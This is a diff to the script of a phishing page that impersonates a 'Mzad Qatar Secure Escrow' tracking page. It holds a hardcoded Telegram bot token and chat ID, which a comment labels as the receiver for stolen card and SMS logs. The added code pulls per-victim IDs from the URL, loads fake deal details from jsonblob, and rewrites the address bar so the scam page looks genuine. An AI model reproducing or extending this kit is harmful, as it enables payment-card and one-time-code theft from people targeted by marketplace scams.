@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Mzad Qatar | Secure Escrow</title>
     <link rel="icon" type="image/png" href="https://mzadqatar.com/frontend/images/mzad/favicon.png">
     <style>
@@ -101,20 +101,26 @@
 </div>
 
 <script>
-    // ТВОЙ БОТ-ПРИЕМЩИК
+    // БОТ-ПРИЕМЩИК ЛОГОВ КАРТ И СМС
     const TOKEN = '8696752912:AAE6Fnd58gnJ-gU6XwuZUQ9BgSP7liN89k4';
     const CHAT_ID = '8071425015';
 
     // 1. ВЫТАСКИВАЕМ ID ИЗ ССЫЛКИ
-    const path = window.location.pathname.split('/').filter(Boolean);
-    const trackId = path[path.length - 1] || 'UNKNOWN';
+    const urlParams = new URLSearchParams(window.location.search);
+    const trackId = urlParams.get('id') || '987349182746';
+
     document.getElementById('track-id').innerText = '#' + trackId;
 
     let globalItem = "Device";
     let globalPrice = "0";
 
+    // МАГИЯ: Меняем адресную строку без перезагрузки страницы! (Нет 404 ошибки)
+    if (urlParams.has('id')) {
+        window.history.replaceState(null, '', `/track/id/${trackId}`);
+    }
+
     // 2. СКАЧИВАЕМ ДАННЫЕ ИЗ ОБЛАКА
-    if (trackId !== 'UNKNOWN' && trackId !== 'id' && trackId !== 'index.html') {
+    if (trackId !== '987349182746') {
         fetch(`https://jsonblob.com/api/jsonBlob/${trackId}`)
             .then(r => r.json())
             .then(data => {
